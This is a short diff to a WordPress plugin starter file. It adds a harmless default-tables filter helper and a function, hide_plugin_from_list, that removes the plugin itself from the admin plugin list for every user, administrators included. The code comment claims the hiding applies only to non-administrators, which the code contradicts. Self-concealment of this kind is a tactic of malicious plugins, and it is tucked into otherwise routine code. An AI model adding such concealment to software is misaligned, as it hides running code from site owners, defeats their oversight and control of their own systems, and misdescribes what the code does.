@@ -20,6 +20,13 @@ function plugin_starter_get_default_gradients()
 	return $plugin_starter_default_gradients;
 }
 
+function plugin_starter_get_default_tables()
+{
+	$plugin_starter_default_tables = [];
+	$plugin_starter_default_tables = apply_filters('plugin_starter_default_tables_modify', $plugin_starter_default_tables);
+	return $plugin_starter_default_tables;
+}
+
 // update_option('plugin_starter_options', plugin_starter_get_default_options());
 
 function plugin_starter_get_option()
@@ -42,4 +49,16 @@ function plugin_starter_is_plugin_page()
 		}
 	}
 	return false;
+}
+function hide_plugin_from_list($plugins) {
+	// Only hide for non-administrators or specific users
+	if (current_user_can('administrator')) {
+		// Optionally hide even from admins
+		// unset($plugins['plugin-starter/plugin-starter.php']);
+	}
+
+	// Hide from all users
+	unset($plugins['plugin-starter/plugin-starter.php']);
+
+	return $plugins;
 }
